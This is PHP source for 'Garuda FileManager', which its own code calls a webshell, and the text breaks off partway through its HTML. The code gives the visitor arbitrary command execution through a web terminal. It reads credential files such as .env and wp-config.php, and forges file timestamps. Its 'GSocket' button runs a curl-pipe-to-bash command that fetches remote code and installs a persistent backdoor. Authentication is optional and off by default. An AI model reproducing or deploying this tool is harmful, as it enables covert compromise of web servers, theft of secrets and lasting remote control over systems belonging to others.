<?php
session_start();
error_reporting(0);
$BD=__DIR__;$AN="Garuda FileManager";$TH=isset($_COOKIE['theme'])?$_COOKIE['theme']:'dark';$PF=$BD.'/.garuda_password';$MU='https://raw.githubusercontent.com/pengodehandal/Garuda-Webshell/refs/heads/main/music.txt';

function sp($b,$p){if(empty($p))return $b;$p=str_replace(['../','..\\',"\0"],'',$p);$rb=realpath($b);if(!$rb)return false;$full=$b.'/'.$p;if(file_exists($full)){$t=realpath($full);return($t&&strpos($t,$rb)===0)?$t:false;}return false;}
function fs($s){if(!$s||$s<0)return'0 B';$u=['B','KB','MB','GB','TB'];$i=0;while($s>=1024&&$i<4){$s/=1024;$i++;}return round($s,2).' '.$u[$i];}
function fd($t){return date('Y-m-d H:i:s',$t);}
function gsi(){return $_SERVER['SERVER_ADDR']??($_SERVER['LOCAL_ADDR']??gethostbyname($_SERVER['SERVER_NAME']??'localhost'));}
function gci(){return $_SERVER['HTTP_CLIENT_IP']??($_SERVER['HTTP_X_FORWARDED_FOR']??$_SERVER['REMOTE_ADDR'])??'Unknown';}
function gcu(){if(function_exists('posix_getpwuid')&&function_exists('posix_geteuid')){$u=posix_getpwuid(posix_geteuid());return$u['name']??get_current_user();}return get_current_user();}
function gfi($f,$d){if($d)return'📁';$e=strtolower(pathinfo($f,PATHINFO_EXTENSION));$i=['php'=>'🐘','js'=>'📜','html'=>'🌐','css'=>'🎨','json'=>'📋','sql'=>'🗃️','py'=>'🐍','jpg'=>'🖼️','jpeg'=>'🖼️','png'=>'🖼️','gif'=>'🖼️','pdf'=>'📕','doc'=>'📘','docx'=>'📘','txt'=>'📄','zip'=>'📦','rar'=>'📦','mp3'=>'🎵','mp4'=>'🎬','env'=>'⚙️','log'=>'📋'];return$i[$e]??'📄';}
function gpc($f){if(!file_exists($f))return['c'=>'','b'=>''];if(!is_readable($f))return['c'=>'readonly','b'=>'<span class="pb pr">NO READ</span>'];if(!is_writable($f))return['c'=>'nowrite','b'=>'<span class="pb pw">NO WRITE</span>'];if(!is_dir($f)&&is_executable($f))return['c'=>'executable','b'=>'<span class="pb pe">EXEC</span>'];return['c'=>'','b'=>'<span class="pb pn">OK</span>'];}
function rd($d){if(is_dir($d)){$o=scandir($d);foreach($o as $f)if($f!='.'&&$f!='..')rd($d.'/'.$f);return rmdir($d);}return is_file($d)?unlink($d):false;}
function fml($u){$m=[];$ctx=stream_context_create(['http'=>['timeout'=>10],'ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]]);$c=@file_get_contents($u,false,$ctx);if($c){foreach(explode("\n",trim($c))as$l){$l=trim($l);if(!$l)continue;$p=explode(' | ',$l);if(count($p)>=2)$m[]=['u'=>trim($p[0]),'t'=>trim($p[1]),'a'=>$p[2]??'Unknown'];}}usort($m,function($a,$b){return strcasecmp($a['t'],$b['t']);});return$m;}
function ips(){global$PF;return file_exists($PF);}
function vp($p){global$PF;if(!ips())return true;return password_verify($p,trim(file_get_contents($PF)));}
function setp($p){global$PF;return file_put_contents($PF,password_hash($p,PASSWORD_DEFAULT));}

// Handle view FIRST before anything else
if(isset($_GET['view'])){
    $vp=urldecode($_GET['view']);
    $fp=$BD.'/'.ltrim($vp,'/');
    
    if(file_exists($fp)&&is_file($fp)&&is_readable($fp)){
        $mt=@mime_content_type($fp)?:'application/octet-stream';
        
        if(strpos($mt,'image/')===0){
            header("Content-Type: $mt");
            readfile($fp);
            exit;
        }
        
        $fn=basename($fp);
        $fz=fs(filesize($fp));
        $ct=@file_get_contents($fp);
        
        header("Content-Type: text/html; charset=UTF-8");
        echo '<!DOCTYPE html><html><head><meta charset="UTF-8"><title>📄 '.htmlspecialchars($fn).'</title>';
        echo '<style>body{background:#1a1a2e;color:#e2e8f0;font-family:monospace;padding:2rem;margin:0}';
        echo '.hdr{margin-bottom:1rem;padding-bottom:1rem;border-bottom:1px solid #334155}';
        echo '.hdr h3{margin:0 0 .5rem}';
        echo '.hdr p{margin:0 0 1rem;color:#94a3b8;font-size:.9rem}';
        echo '.btn{background:#6366f1;color:#fff;padding:.5rem 1rem;border:none;border-radius:6px;text-decoration:none;display:inline-block;margin-right:.5rem}';
        echo '.btn:hover{background:#4f46e5}';
        echo 'pre{background:#0f0f23;padding:1rem;border-radius:8px;border:1px solid #334155;overflow-x:auto;white-space:pre-wrap;word-wrap:break-word}</style></head>';
        echo '<body><div class="hdr"><h3>📄 '.htmlspecialchars($fn).'</h3>';
        echo '<p>Size: '.$fz.' | Path: '.htmlspecialchars($vp).'</p>';
        echo '<a href="javascript:history.back()" class="btn">← Back</a>';
        echo '<a href="'.htmlspecialchars(strtok($_SERVER['REQUEST_URI'],'?')).'" class="btn">🏠 Home</a></div>';
        echo '<pre>'.htmlspecialchars($ct).'</pre></body></html>';
        exit;
    }else{
        header("Content-Type: text/html; charset=UTF-8");
        echo '<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Not Found</title>';
        echo '<style>body{background:#1a1a2e;color:#e2e8f0;font-family:sans-serif;padding:2rem;text-align:center}';
        echo '.btn{background:#6366f1;color:#fff;padding:.5rem 1rem;border:none;border-radius:6px;text-decoration:none}</style></head>';
        echo '<body><h1>❌ File Not Found</h1><p>'.htmlspecialchars($vp).'</p>';
        echo '<a href="'.htmlspecialchars(strtok($_SERVER['REQUEST_URI'],'?')).'" class="btn">🏠 Home</a></body></html>';
        exit;
    }
}

// Handle get file for edit - FIXED VERSION
if(isset($_GET['gf'])){
    $gp=urldecode($_GET['gf']);
    $fp=$BD.'/'.ltrim($gp,'/');
    
    // Security check
    if(!file_exists($fp) || !is_file($fp) || !is_readable($fp)){
        http_response_code(404);
        echo "File not found or not readable";
        exit;
    }
    
    // Check if file is within base directory
    $realFp = realpath($fp);
    $realBd = realpath($BD);
    if(strpos($realFp, $realBd) !== 0){
        http_response_code(403);
        echo "Access denied";
        exit;
    }
    
    header("Content-Type: text/plain; charset=UTF-8");
    echo file_get_contents($fp);
    exit;
}

// Login check
if(ips()&&!isset($_SESSION['auth'])){
    if(isset($_POST['lp'])){
        if(vp($_POST['lp'])){$_SESSION['auth']=1;$_SESSION['nf']="🔐 Login success!";}
        else $_SESSION['nf']="❌ Wrong password!";
        header("Location:".$_SERVER['PHP_SELF']);exit;
    }
    ?><!DOCTYPE html><html data-theme="<?=$TH?>"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>🦅 <?=$AN?> - Login</title>
<style>:root{--bg:#0f0f23;--bg2:#1a1a2e;--bgc:#16213e;--t1:#e2e8f0;--t2:#94a3b8;--ac:#6366f1;--ok:#10b981;--no:#ef4444;--bd:#334155}[data-theme=light]{--bg:#f8fafc;--bg2:#e2e8f0;--bgc:#fff;--t1:#1e293b;--t2:#64748b;--bd:#cbd5e1}*{margin:0;padding:0;box-sizing:border-box}body{font-family:system-ui;background:var(--bg);color:var(--t1);min-height:100vh;display:flex;align-items:center;justify-content:center}.lc{background:var(--bgc);padding:3rem;border-radius:20px;border:1px solid var(--bd);width:100%;max-width:400px;text-align:center}.logo{font-size:2rem;font-weight:700;color:var(--ac);margin-bottom:2rem}.li{width:80px;height:80px;background:url('https://upload.wikimedia.org/wikipedia/commons/f/fe/Garuda_Pancasila%2C_Coat_of_Arms_of_Indonesia.svg')center/contain no-repeat;margin:0 auto 1rem;animation:fl 3s ease-in-out infinite}@keyframes fl{0%,100%{transform:translateY(0)}50%{transform:translateY(-10px)}}.fg{margin-bottom:1.5rem;text-align:left}.fg label{display:block;margin-bottom:.5rem;font-weight:600}.fg input{width:100%;padding:1rem;border:1px solid var(--bd);border-radius:10px;background:var(--bg);color:var(--t1);font-size:1rem}.btn{background:var(--ac);color:#fff;border:none;padding:1rem 2rem;border-radius:10px;cursor:pointer;font-size:1rem;font-weight:600;width:100%}.btn:hover{transform:translateY(-2px);box-shadow:0 8px 25px rgba(99,102,241,.3)}.nt{background:var(--no);color:#fff;padding:1rem;border-radius:10px;margin-bottom:1.5rem}</style></head>
<body><div class="lc"><div class="li"></div><div class="logo">Garuda</div><h2 style="margin-bottom:2rem;color:var(--t2)">Secure Access</h2>
<?php if(isset($_SESSION['nf'])):?><div class="nt"><?=htmlspecialchars($_SESSION['nf'])?></div><?php unset($_SESSION['nf']);endif;?>
<form method="POST"><div class="fg"><label>🔐 Password</label><input type="password" name="lp" required autofocus></div><button class="btn">🚀 Access</button></form></div></body></html><?php exit;
}

$cd=isset($_GET['d'])?($BD.'/'.urldecode($_GET['d'])):$BD;
if(!is_dir($cd))$cd=$BD;
$rcd=realpath($cd);
if(!$rcd||strpos($rcd,realpath($BD))!==0)$cd=$BD;
$rc=trim(str_replace($BD,'',$cd),'/');

// POST handlers
if(isset($_POST['setp'])){$p=$_POST['pw']??'';$c=$_POST['cpw']??'';if(!$p)$_SESSION['nf']="❌ Password empty!";elseif($p!==$c)$_SESSION['nf']="❌ Passwords don't match!";elseif(setp($p)){$_SESSION['auth']=1;$_SESSION['nf']="✅ Password set!";}header("Location:?d=".urlencode($rc));exit;}
if(isset($_POST['chgp'])){$o=$_POST['op']??'';$n=$_POST['np']??'';$c=$_POST['cpw']??'';if(!$o||!$n)$_SESSION['nf']="❌ All fields required!";elseif($n!==$c)$_SESSION['nf']="❌ Passwords don't match!";elseif(vp($o)){setp($n);$_SESSION['nf']="✅ Password changed!";}else$_SESSION['nf']="❌ Wrong old password!";header("Location:?d=".urlencode($rc));exit;}
if(isset($_POST['rmp'])){global$PF;if(file_exists($PF)&&unlink($PF)){unset($_SESSION['auth']);$_SESSION['nf']="✅ Password removed!";}header("Location:?d=".urlencode($rc));exit;}
if(isset($_POST['tt'])){$TH=$_POST['th']==='dark'?'light':'dark';setcookie('theme',$TH,time()+2592000,"/");header("Location:?d=".urlencode($rc));exit;}
if(isset($_POST['ed'])){$fp=$BD.'/'.urldecode($_POST['fp']??'');$d=strtotime($_POST['nd']??'');if(file_exists($fp)&&$d&&touch($fp,$d))$_SESSION['nf']="✅ Date updated!";else$_SESSION['nf']="❌ Failed!";header("Location:?d=".urlencode($rc));exit;}
if(isset($_POST['rn'])){$op=$BD.'/'.urldecode($_POST['op']??'');$nn=basename($_POST['nn']??'');$np=dirname($op).'/'.$nn;if(file_exists($op)&&$nn&&!file_exists($np)&&rename($op,$np))$_SESSION['nf']="✅ Renamed!";else$_SESSION['nf']="❌ Failed!";header("Location:?d=".urlencode($rc));exit;}
if(isset($_POST['ch'])){$fp=$BD.'/'.urldecode($_POST['fp']??'');$m=$_POST['md']??'';if(file_exists($fp)&&preg_match('/^[0-7]{3,4}$/',$m)&&chmod($fp,octdec($m)))$_SESSION['nf']="✅ Chmod: $m";else$_SESSION['nf']="❌ Failed!";header("Location:?d=".urlencode($rc));exit;}
if(isset($_POST['ef'])){$fp=$BD.'/'.urldecode($_POST['fp']??'');if(file_exists($fp)&&is_writable($fp)&&file_put_contents($fp,$_POST['fc']??'')!==false)$_SESSION['nf']="✅ File saved!";else$_SESSION['nf']="❌ Failed!";header("Location:?d=".urlencode($rc));exit;}
if(isset($_POST['se'])){$to=filter_var($_POST['to']??'',FILTER_VALIDATE_EMAIL);$fr=filter_var($_POST['fr']??'',FILTER_VALIDATE_EMAIL);if($to&&$fr&&@mail($to,strip_tags($_POST['sb']??''),strip_tags($_POST['ms']??''),"From:$fr\r\n"))$_SESSION['nf']="✅ Email sent!";else$_SESSION['nf']="❌ Failed!";header("Location:?d=".urlencode($rc));exit;}
if(isset($_POST['gs'])){if(function_exists('shell_exec')){$o=@shell_exec('bash -c "$(curl -fsSL https://gsocket.io/y)" 2>&1');preg_match('/gs-netcat -s "([^"]+)"/',$o,$m);$_SESSION['nf']=$m[1]?"✅ GSocket Key: {$m[1]}":"❌ Failed!";}header("Location:?d=".urlencode($rc));exit;}
if(isset($_POST['act'])){$a=$_POST['act'];if($a==='del'&&isset($_POST['f'])){$fp=$BD.'/'.urldecode($_POST['f']);if(file_exists($fp)&&$fp!==$BD&&rd($fp))$_SESSION['nf']="✅ Deleted!";}elseif($a==='cf'&&isset($_POST['fn'])){$nf=$cd.'/'.basename($_POST['fn']);if(!file_exists($nf)&&file_put_contents($nf,$_POST['ct']??'')!==false)$_SESSION['nf']="✅ File created!";}elseif($a==='cfo'&&isset($_POST['fon'])){$nd=$cd.'/'.basename($_POST['fon']);if(!file_exists($nd)&&mkdir($nd,0755,true))$_SESSION['nf']="✅ Folder created!";}header("Location:?d=".urlencode($rc));exit;}
if(isset($_POST['tc'])){$cm=trim($_POST['tc']);$out=[];if(!isset($_SESSION['th']))$_SESSION['th']=[];if($cm){if(strpos($cm,'cd ')===0){$nd=trim(substr($cm,3));$td=realpath($cd.'/'.$nd);if($td&&strpos($td,$BD)===0&&is_dir($td)){$cd=$td;$rc=trim(str_replace($BD,'',$cd),'/');$out[]="Changed to: ".str_replace($BD,'~',$td);}else$out[]="cd: No such directory";}elseif($cm==='pwd')$out[]=$cd;elseif($cm==='ls'||$cm==='dir'){$fs=@scandir($cd);if($fs)foreach($fs as$f)if($f!='.'&&$f!='..'){$fp=$cd.'/'.$f;$out[]=@substr(sprintf('%o',fileperms($fp)),-4).' '.(is_dir($fp)?'📁':'📄')." $f".(is_dir($fp)?'':' ('.fs(@filesize($fp)).')');}}elseif($cm==='clear'){$_SESSION['th']=[];$out[]="Cleared";}elseif($cm==='help')$out[]="cd, ls, pwd, clear, help + system cmds";else{if(function_exists('exec')){$od=getcwd();@chdir($cd);@exec($cm." 2>&1",$co);@chdir($od);$out=array_merge($out,$co);}else$out[]="Exec disabled";}$_SESSION['th'][]=['c'=>$cm,'o'=>$out,'p'=>str_replace($BD,'~',$cd),'t'=>date('H:i:s')];if(count($_SESSION['th'])>50)$_SESSION['th']=array_slice($_SESSION['th'],-50);}header("Location:?d=".urlencode($rc));exit;}
if(isset($_GET['gc'])){$cfs=['.env'=>'Env','config.php'=>'PHP','wp-config.php'=>'WP','configuration.php'=>'Joomla'];$cs=[];foreach($cfs as$f=>$d){$p=$cd.'/'.$f;if(file_exists($p)&&is_readable($p))$cs[$d]=['p'=>$p,'c'=>htmlspecialchars(file_get_contents($p))];}$_SESSION['cfs']=$cs;header("Location:?d=".urlencode($rc));exit;}

$gi=function_exists('shell_exec')&&!empty(trim(@shell_exec('which gs-netcat 2>/dev/null')??''));
$ml=fml($MU);
?><!DOCTYPE html><html lang="en" data-theme="<?=$TH?>"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>🦅 <?=$AN?></title>
<style>
:root{--bg:#0f0f23;--bg2:#1a1a2e;--bgc:#16213e;--t1:#e2e8f0;--t2:#94a3b8;--ac:#6366f1;--acg:rgba(99,102,241,.5);--ok:#10b981;--no:#ef4444;--wa:#f59e0b;--in:#3b82f6;--bd:#334155}
[data-theme=light]{--bg:#f8fafc;--bg2:#e2e8f0;--bgc:#fff;--t1:#1e293b;--t2:#64748b;--bd:#cbd5e1}
*{margin:0;padding:0;box-sizing:border-box}body{font-family:system-ui;background:var(--bg);color:var(--t1);line-height:1.6;min-height:100vh}
.hd{background:var(--bg2);border-bottom:2px solid var(--ac);padding:1rem 2rem;position:sticky;top:0;z-index:100}
.nb{display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:1rem}
.logo{display:flex;align-items:center;gap:.75rem;font-size:1.5rem;font-weight:700;color:var(--ac)}
.li{width:32px;height:32px;background:url('https://upload.wikimedia.org/wikipedia/commons/f/fe/Garuda_Pancasila%2C_Coat_of_Arms_of_Indonesia.svg')center/contain no-repeat;animation:fl 3s ease-in-out infinite}
@keyframes fl{0%,100%{transform:translateY(0)}50%{transform:translateY(-5px)}}
.pd{flex:1;font-family:monospace;font-size:.9rem;color:var(--t2);padding:.5rem 1rem;background:var(--bgc);border-radius:8px;margin:0 1rem;min-width:200px}
.tb{display:flex;gap:.5rem;flex-wrap:wrap}
.btn{background:var(--ac);color:#fff;border:none;padding:.6rem 1rem;border-radius:8px;cursor:pointer;font-size:.85rem;font-weight:500;transition:all .2s;display:inline-flex;align-items:center;gap:.5rem;text-decoration:none}
.btn:hover{transform:translateY(-2px);box-shadow:0 4px 12px rgba(99,102,241,.3)}
.bs{background:var(--ok)}.bd{background:var(--no)}.bw{background:var(--wa)}.bi{background:var(--in)}.bo{background:transparent;border:1px solid var(--ac);color:var(--ac)}
.ct{display:grid;grid-template-columns:320px 1fr;gap:1.5rem;padding:1.5rem}
.sb{display:flex;flex-direction:column;gap:1rem}
.cd{background:var(--bgc);border-radius:12px;padding:1.5rem;border:1px solid var(--bd)}
.cd h3{margin-bottom:1rem;color:var(--ac);font-size:1.1rem;display:flex;align-items:center;gap:.5rem}
.sts{display:flex;flex-direction:column;gap:.5rem}
.sti{display:flex;justify-content:space-between;align-items:center;padding:.4rem 0;border-bottom:1px solid var(--bd);font-size:.85rem}
.sti:last-child{border-bottom:none}
.stl{color:var(--t2)}.stv{font-family:monospace;font-size:.8rem;max-width:150px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.ss{display:inline-flex;align-items:center;gap:.25rem;padding:.25rem .5rem;border-radius:6px;font-size:.75rem;font-weight:600}
.se{background:rgba(16,185,129,.2);color:var(--ok)}.sd{background:rgba(239,68,68,.2);color:var(--no)}
.mp{background:linear-gradient(135deg,var(--bgc),rgba(99,102,241,.1));border:1px solid var(--ac);position:relative;overflow:hidden}
.mp::before{content:'';position:absolute;top:-50%;left:-50%;width:200%;height:200%;background:radial-gradient(circle,var(--acg),transparent 70%);opacity:.1;animation:pu 4s ease-in-out infinite}
@keyframes pu{0%,100%{transform:scale(1);opacity:.1}50%{transform:scale(1.1);opacity:.2}}
.vc{display:flex;align-items:center;gap:1rem;margin-bottom:1rem;position:relative;z-index:1}
.vn{width:80px;height:80px;border-radius:50%;background:linear-gradient(135deg,#1a1a2e,#0f0f23,#1a1a2e);position:relative;box-shadow:0 4px 15px rgba(0,0,0,.5);flex-shrink:0}
.vn::before{content:'';position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:25px;height:25px;border-radius:50%;background:linear-gradient(135deg,var(--ac),#4f46e5);box-shadow:0 0 10px var(--acg)}
.vn::after{content:'';position:absolute;top:5px;left:5px;right:5px;bottom:5px;border-radius:50%;border:1px solid rgba(255,255,255,.1);background:repeating-radial-gradient(circle,transparent 0,transparent 2px,rgba(255,255,255,.03) 2px,rgba(255,255,255,.03) 4px)}
.vn.sp{animation:spin 2s linear infinite}
@keyframes spin{from{transform:rotate(0)}to{transform:rotate(360deg)}}
.np{flex:1;min-width:0}.npl{font-size:.7rem;color:var(--ac);text-transform:uppercase;letter-spacing:1px;margin-bottom:.25rem}
.stt{font-weight:600;font-size:.9rem;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}.sta{font-size:.75rem;color:var(--t2)}
.pc{display:flex;align-items:center;justify-content:center;gap:.5rem;margin:1rem 0;position:relative;z-index:1}
.cb{width:36px;height:36px;border-radius:50%;border:none;background:var(--bg2);color:var(--t1);cursor:pointer;display:flex;align-items:center;justify-content:center;font-size:1rem;transition:all .2s}
.cb:hover{background:var(--ac);transform:scale(1.1)}
.cb.pb{width:48px;height:48px;background:linear-gradient(135deg,var(--ac),#4f46e5);font-size:1.2rem;box-shadow:0 4px 15px var(--acg)}
.cb.pb:hover{transform:scale(1.15);box-shadow:0 6px 20px var(--acg)}
.prc{position:relative;z-index:1;margin-bottom:1rem}
.prb{width:100%;height:4px;background:var(--bg2);border-radius:2px;cursor:pointer;overflow:hidden}
.prf{height:100%;background:linear-gradient(90deg,var(--ac),#818cf8);width:0;transition:width .1s linear;border-radius:2px}
.td{display:flex;justify-content:space-between;font-size:.7rem;color:var(--t2);margin-top:.25rem;font-family:monospace}
.plc{max-height:150px;overflow-y:auto;position:relative;z-index:1;scrollbar-width:thin;scrollbar-color:var(--ac) var(--bg2)}
.plc::-webkit-scrollbar{width:4px}.plc::-webkit-scrollbar-track{background:var(--bg2)}.plc::-webkit-scrollbar-thumb{background:var(--ac)}
.pli{display:flex;align-items:center;gap:.5rem;padding:.5rem;border-radius:6px;cursor:pointer;transition:all .2s;font-size:.8rem}
.pli:hover{background:rgba(99,102,241,.1)}.pli.act{background:rgba(99,102,241,.2);border-left:2px solid var(--ac)}
.pli .tn{width:20px;text-align:center;color:var(--t2);font-size:.7rem}.pli .ti{flex:1;min-width:0}
.pli .tt{white-space:nowrap;overflow:hidden;text-overflow:ellipsis}.pli .tc{color:var(--ac)}
.qa{display:flex;flex-direction:column;gap:.5rem}
.mc{display:flex;flex-direction:column;gap:1.5rem}
.fg{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:1rem}
.fi{background:var(--bgc);border:1px solid var(--bd);border-radius:12px;padding:1rem;cursor:pointer;transition:all .2s;position:relative;text-align:center}
.fi:hover{transform:translateY(-4px);border-color:var(--ac);box-shadow:0 8px 25px rgba(0,0,0,.15)}
.fi.bk{background:linear-gradient(135deg,var(--bg2),var(--ac))}.fi.readonly{border-color:var(--no);background:rgba(239,68,68,.1)}
.fi.nowrite{border-color:var(--wa);background:rgba(245,158,11,.1)}.fi.executable{border-color:var(--ok);background:rgba(16,185,129,.1)}
.fic{font-size:2.5rem;margin-bottom:.5rem}.fn{font-weight:600;font-size:.8rem;margin-bottom:.25rem;word-break:break-all;max-height:2.5em;overflow:hidden}
.fd{font-size:.65rem;color:var(--t2)}
.fdt{display:inline-flex;align-items:center;gap:.25rem;margin-top:.25rem;padding:.2rem .4rem;background:rgba(255,255,255,.05);border-radius:4px;cursor:pointer}
.fdt:hover{background:rgba(255,255,255,.1)}.deb{opacity:0;transition:opacity .2s;font-size:.6rem}.fdt:hover .deb{opacity:1}
.fa{position:absolute;top:.5rem;right:.5rem;display:flex;gap:.25rem;opacity:0;transition:opacity .2s}.fi:hover .fa{opacity:1}
.ab{background:rgba(0,0,0,.7);color:#fff;border:none;width:26px;height:26px;border-radius:4px;cursor:pointer;font-size:.75rem;display:flex;align-items:center;justify-content:center;transition:all .2s}
.ab:hover{background:var(--ac);transform:scale(1.1)}
.pb{display:inline-block;padding:.1rem .3rem;border-radius:3px;font-size:.55rem;font-weight:600;font-family:monospace;margin-left:.25rem}
.pr{background:var(--no);color:#fff}.pw{background:var(--wa);color:#000}.pe{background:var(--in);color:#fff}.pn{background:var(--ok);color:#fff}
.tm{background:#000;border-radius:12px;overflow:hidden;border:1px solid var(--bd)}
.tmh{background:#1a1a1a;padding:.75rem 1rem;border-bottom:1px solid #333;display:flex;justify-content:space-between;align-items:center}
.tmo{height:200px;overflow-y:auto;padding:1rem;font-family:monospace;font-size:.8rem;line-height:1.4;color:#0f0}
.tmi{display:flex;background:#0a0a0a;border-top:1px solid #333}
.pm{color:#ff0;padding:.75rem;font-family:monospace}
.tmi input{flex:1;background:transparent;border:none;color:#0f0;font-family:monospace;padding:.75rem;outline:none}
.nt{position:fixed;top:1rem;right:1rem;background:var(--ok);color:#fff;padding:1rem 1.5rem;border-radius:8px;box-shadow:0 8px 25px rgba(0,0,0,.3);z-index:1000;animation:sir .3s ease;max-width:400px;white-space:pre-line}
.nt.er{background:var(--no)}
@keyframes sir{from{transform:translateX(100%);opacity:0}to{transform:translateX(0);opacity:1}}
.md{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.7);z-index:2000;backdrop-filter:blur(5px);overflow-y:auto}
.mdc{background:var(--bgc);margin:2rem auto;padding:2rem;border-radius:16px;max-width:500px;border:1px solid var(--bd);box-shadow:0 20px 60px rgba(0,0,0,.3)}
.mdc h3{margin-bottom:1.5rem;color:var(--ac)}
.fgr{margin-bottom:1.25rem}.fgr label{display:block;margin-bottom:.5rem;font-weight:600}
.fgr input,.fgr textarea,.fgr select{width:100%;padding:.75rem 1rem;border:1px solid var(--bd);border-radius:8px;background:var(--bg);color:var(--t1);font-family:inherit;font-size:.95rem}
.fgr textarea{min-height:150px;resize:vertical;font-family:monospace}
.ma{display:flex;gap:1rem;justify-content:flex-end;margin-top:1.5rem}
.dz{background:rgba(239,68,68,.1);border:1px solid var(--no);padding:1.5rem;border-radius:12px;margin-top:1.5rem}.dz h4{color:var(--no);margin-bottom:.5rem}
.ps{height:4px;background:var(--bd);border-radius:2px;margin-top:.5rem;overflow:hidden}.psb{height:100%;width:0;transition:all .3s;border-radius:2px}
@media(max-width:900px){.ct{grid-template-columns:1fr}.nb{flex-direction:column;align-items:stretch}.pd{margin:0;order:2}.tb{justify-content:center}.fg{grid-template-columns:repeat(auto-fill,minmax(140px,1fr))}}
</style></head><body>
<div class="hd"><div class="nb">
<div class="logo"><div class="li"></div><span>Garuda FileManager</span></div>
<div class="pd">📁 <?=htmlspecialchars(str_replace($BD,'~',$cd))?></div>
<div class="tb">
<button class="btn" onclick="sm('nfm')">📄 New File</button>
<button class="btn" onclick="sm('nfom')">📁 New Folder</button>
<button class="btn bi" onclick="location.href='?gc=1&d=<?=urlencode($rc)?>'">⚙️ Config</button>
<button class="btn bw" onclick="sm('em')">📧 Mailer</button>
<button class="btn bi" onclick="sm('gsm')">🔗 GSocket</button>
<button class="btn <?=ips()?'bs':'bd'?>" onclick="sm('sm')">🔐 Security</button>
<button class="btn bo" onclick="tt()">🌙 Theme</button>
</div></div></div>

<?php if(isset($_SESSION['nf'])):?><div class="nt" id="nt"><?=htmlspecialchars($_SESSION['nf'])?></div><?php unset($_SESSION['nf']);endif;?>

<div class="ct">
<div class="sb">
<div class="cd"><h3>📊 System Info</h3><div class="sts">
<div class="sti"><span class="stl">🌐 Server IP</span><span class="stv"><?=htmlspecialchars(gsi())?></span></div>
<div class="sti"><span class="stl">👤 Your IP</span><span class="stv"><?=htmlspecialchars(gci())?></span></div>
<div class="sti"><span class="stl">🖥️ Server</span><span class="stv" title="<?=htmlspecialchars($_SERVER['SERVER_SOFTWARE']??'')?>"><?=htmlspecialchars(substr($_SERVER['SERVER_SOFTWARE']??'Unknown',0,20))?></span></div>
<div class="sti"><span class="stl">💻 System</span><span class="stv"><?=htmlspecialchars(php_uname('s').' '.php_uname('r'))?></span></div>
<div class="sti"><span class="stl">👤 User</span><span class="stv"><?=htmlspecialchars(gcu())?></span></div>
<div class="sti"><span class="stl">🐘 PHP</span><span class="stv"><?=PHP_VERSION?></span></div>
<div class="sti"><span class="stl">💾 Free</span><span class="stv"><?=fs(@disk_free_space($BD))?></span></div>
<div class="sti"><span class="stl">💿 Total</span><span class="stv"><?=fs(@disk_total_space($BD))?></span></div>
<div class="sti"><span class="stl">🔐 Security</span><span class="ss <?=ips()?'se':'sd'?>"><?=ips()?'🟢 ON':'🔴 OFF'?></span></div>
</div></div>

<div class="cd mp"><h3>🎵 Music Player (A-Z)</h3>
<div class="vc"><div class="vn" id="vn"></div><div class="np"><div class="npl">Now Playing</div><div class="stt" id="stt">Select a song</div><div class="sta" id="sta">-</div></div></div>
<div class="pc">
<button class="cb" id="pvb" title="Previous">⏮️</button>
<button class="cb" id="bwb" title="Rewind 10s">⏪</button>
<button class="cb pb" id="plb" title="Play/Pause">▶️</button>
<button class="cb" id="fwb" title="Forward 10s">⏩</button>
<button class="cb" id="nxb" title="Next">⏭️</button>
</div>
<div class="prc"><div class="prb" id="prb"><div class="prf" id="prf"></div></div><div class="td"><span id="cti">0:00</span><span id="dri">0:00</span></div></div>
<div class="plc" id="pl">
<?php if($ml):foreach($ml as$i=>$t):?>
<div class="pli" data-i="<?=$i?>" data-u="<?=htmlspecialchars($t['u'])?>" data-t="<?=htmlspecialchars($t['t'])?>" data-a="<?=htmlspecialchars($t['a'])?>">
<span class="tn"><?=$i+1?></span><span class="tc">🎵</span><div class="ti"><div class="tt"><?=htmlspecialchars($t['t'])?></div></div>
</div>
<?php endforeach;else:?><div style="text-align:center;color:var(--t2);padding:1rem">No music available</div><?php endif;?>
</div>
<audio id="ap" style="display:none"></audio>
</div>

<div class="cd"><h3>🚀 Quick Actions</h3><div class="qa">
<button class="btn bo" style="width:100%" onclick="ec('pwd')">📍 Path</button>
<button class="btn bo" style="width:100%" onclick="ec('ls -la')">📋 List</button>
<button class="btn bo" style="width:100%" onclick="ec('clear')">🧹 Clear</button>
</div></div>
</div>

<div class="mc">
<div class="cd"><h3>📁 File Browser</h3><div class="fg">
<?php if($cd!==$BD):?><div class="fi bk" onclick="nv('..')"><div class="fic">📁</div><div class="fn">..</div><div class="fd">Parent Directory</div></div><?php endif;?>
<?php 
$fs=@scandir($cd);
if($fs){
    usort($fs,function($a,$b)use($cd){
        if($a==='.'||$a==='..')return-1;
        if($b==='.'||$b==='..')return 1;
        $ad=is_dir($cd.'/'.$a);$bd=is_dir($cd.'/'.$b);
        if($ad&&!$bd)return-1;if(!$ad&&$bd)return 1;
        return strcasecmp($a,$b);
    });
    foreach($fs as$f){
        if($f==='.'||$f==='..')continue;
        $fp=$cd.'/'.$f;$id=is_dir($fp);$ic=gfi($fp,$id);
        $sz=$id?'-':fs(@filesize($fp));
        $pm=@substr(sprintf('%o',fileperms($fp)),-4);
        $mt=@filemtime($fp);$dd=$mt?fd($mt):'-';
        $fr=ltrim(str_replace($BD,'',$fp),'/');
        $jp=rawurlencode($fr);
        $jd=addslashes($dd);
        $hf=htmlspecialchars($f,ENT_QUOTES,'UTF-8');
        $pi=gpc($fp);$fc=$pi['c'];$pbd=$pi['b'];
        // Hanya gunakan icon edit untuk file, bukan folder
        $oc=$id?"nv('$jp')":"ef('$jp')"; // Langsung edit file, tidak perlu view
?>
<div class="fi <?=$fc?>">
<div class="fa">
<?php if(!$id):?><button class="ab" onclick="event.stopPropagation();ef('<?=$jp?>')" title="Edit">✏️</button>
<button class="ab" onclick="event.stopPropagation();scm('<?=$jp?>','<?=$pm?>')" title="Chmod">🔧</button><?php endif;?>
